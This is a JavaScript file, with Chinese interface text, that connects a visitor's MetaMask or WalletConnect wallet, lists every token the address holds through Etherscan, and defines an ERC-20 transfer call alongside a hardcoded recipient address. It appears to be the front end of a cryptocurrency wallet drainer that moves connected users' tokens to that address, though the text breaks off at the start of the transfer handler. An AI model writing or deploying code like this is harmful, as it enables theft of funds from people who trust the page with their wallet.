const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
const etherscanApiKey = 'YOUR_ETHERSCAN_API_KEY'; // 替换为你的 Etherscan API Key
let web3;
let walletConnectProvider;
let isConnected = false;

const erc20Abi = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "success", "type": "bool"}],
        "type": "function"
    }
];

document.getElementById('connectButton').onclick = async () => {
    const selectedWallet = document.getElementById('walletSelector').value;

    try {
        if (isConnected) {
            document.getElementById('status').innerText = '已连接的设备，请先断开连接';
            return;
        }

        if (selectedWallet === 'metamask') {
            if (window.ethereum) {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();
                updateWalletList(accounts[0]);
                isConnected = true;
                document.getElementById('status').innerText = 'MetaMask 已连接';
            } else {
                document.getElementById('status').innerText = '请安装 MetaMask 钱包';
            }
        } else if (selectedWallet === 'walletconnect') {
            walletConnectProvider = new WalletConnectProvider({
                infuraId: "YOUR_INFURA_PROJECT_ID",
            });

            await walletConnectProvider.enable();
            web3 = new Web3(walletConnectProvider);
            const accounts = await web3.eth.getAccounts();
            updateWalletList(accounts[0]);
            isConnected = true;
            document.getElementById('status').innerText = 'WalletConnect 已连接';
        }

        document.getElementById('transferButton').disabled = false;
    } catch (error) {
        document.getElementById('status').innerText = '连接失败: ' + error.message;
    }
};

const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

const disconnectWallet = async () => {
    if (walletConnectProvider) {
        await walletConnectProvider.disconnect();
        walletConnectProvider = null;
    }
    web3 = null;
    isConnected = false;
    document.getElementById('status').innerText = '已断开连接';
    document.getElementById('walletList').innerHTML = ''; // 清空钱包列表
};

document.getElementById('disconnectButton').onclick = disconnectWallet;

async function getTokenBalances(address) {
    try {
        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=${etherscanApiKey}`;
        const response = await axios.get(url);
        const transactions = response.data.result;

        const tokenBalances = {};

        for (const tx of transactions) {
            const tokenAddress = tx.contractAddress;
            const tokenSymbol = tx.tokenSymbol;

            if (!tokenBalances[tokenAddress]) {
                tokenBalances[tokenAddress] = {
                    symbol: tokenSymbol,
                    balance: web3.utils.toBN(0)
                };
            }

            if (tx.from.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
            }

            if (tx.to.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.add(web3.utils.toBN(tx.value));
            }
        }

        return tokenBalances;
    } catch (error) {
        document.getElementById('status').innerText = '获取代币余额失败: ' + error.message;
    }
}

document.getElementById('transferButton').onclick = async
